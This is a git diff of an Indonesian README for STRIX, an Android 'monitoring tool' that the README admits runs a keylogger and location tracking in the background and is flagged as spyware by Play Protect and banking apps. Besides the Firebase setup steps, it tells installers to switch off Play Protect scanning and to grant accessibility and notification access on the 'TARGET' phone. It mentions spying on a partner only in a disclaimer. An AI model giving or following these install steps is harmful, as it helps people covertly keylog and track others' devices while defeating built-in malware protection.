@@ -1,6 +1,6 @@
 # STRIX 🦉
 
-STRIX adalah aplikasi Monitoring tool Android
+STRIX adalah aplikasi Monitoring tool untuk Android
 
 ## Fitur ✨
 
@@ -17,13 +17,14 @@ STRIX adalah aplikasi Monitoring tool Android
 2. Klik **Add project** , beri nama, dan lanjutkan sampai selesai.
 
 ### 2. Copy Kredensial (WEB API Key, App ID, Project ID)
-1. Di halaman utama Firebase Console (dalam project yang baru dibuat), klik logo **Android** `< / >` atau ikon gear ⚙️ **Project settings** (Pengaturan Proyek).
+1. Di halaman utama Firebase Console (dalam project yang baru dibuat), klik logo **Android** atau ikon gear ⚙️ **Project settings** (Pengaturan Proyek).
 2. Tambahkan aplikasi Android. Masukkan **Package Name** `com.strix.safesync`
 3. Setelah aplikasi Android terdaftar, scroll ke bawah ke bagian **Your apps** (Aplikasi Anda) di dalam Project Settings.
 4. Di situ akan ada:
    - **App ID**
    - **Project ID**
-   - **Web API Key**: Terdapat pada bagian **General** > **Project Credentials** > Web API Key.
+   - **Web API Key**
+   NOTE : jika web api key tidak muncul , klik **add app** lalu pilih icon WEB **</>**
 
 ### 3. Aktifkan Layanan Firebase
 Sebelum mulai dipakai, **Wajib** mengaktifkan layanan berikut di panel sebelah kiri Firebase Console:
@@ -37,7 +38,7 @@ Sebelum mulai dipakai, **Wajib** mengaktifkan layanan berikut di panel sebelah k
 ### 4. Input di Aplikasi STRIX
 1. Buka aplikasi.
 2. Di halaman awal "Select Your Role", klik tombol **⚙️ Custom Server Config** di paling bawah.
-3. Masukkan ke-3 data tersebut:
+3. Masukkan ke-3 data tersebut yang sudah di copy dari firebase console:
    - **Web API Key**: `AIzaSy...`
    - **App ID**: `1:xxxx:android:yyyy`
    - **Project ID**: `nama-project`
@@ -48,7 +49,7 @@ Sebelum mulai dipakai, **Wajib** mengaktifkan layanan berikut di panel sebelah k
 **Penting:** Karena STRIX ini berjalan di latar belakang dan izin akses berat (Keylogger dan Lokasi), **Google Play Protect dan beberapa aplikasi m-banking mendeteksi aplikasi ini sebagai Spyware/Malware.**
 
 *   Cara install, **WAJIB** ke Play Store -> klik Profil -> **Play Protect** -> klik ikon gir (⚙️) -> **Matikann fitur "Scan apps with Play Protect"**. **WAJIB Aktifkan Special apps/access notification & accessibility untuk aplikasi ini di pengaturan hp TARGET/CLIENT**
-*   Proyek ini **HANYA Untuk Edukasi** atau pantau HP anak/family , Jika dipakai untuk hal menyimpang (menyadap pacar, dsb) tanpa ada kesepakatan, risiko ditanggung sendiri! **DEVELOPER TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN APLIKASI INI!**
+*   Project ini **HANYA Untuk Edukasi** atau pantau HP anak/family , Jika dipakai untuk hal menyimpang (menyadap pacar, dsb) tanpa ada kesepakatan, resiko ditanggung sendiri! **DEVELOPER TIDAK BERTANGGUNG JAWAB ATAS PENYALAHGUNAAN APLIKASI INI!**
 
 ## Lisensi
 MIT License bebas pakai 🍻
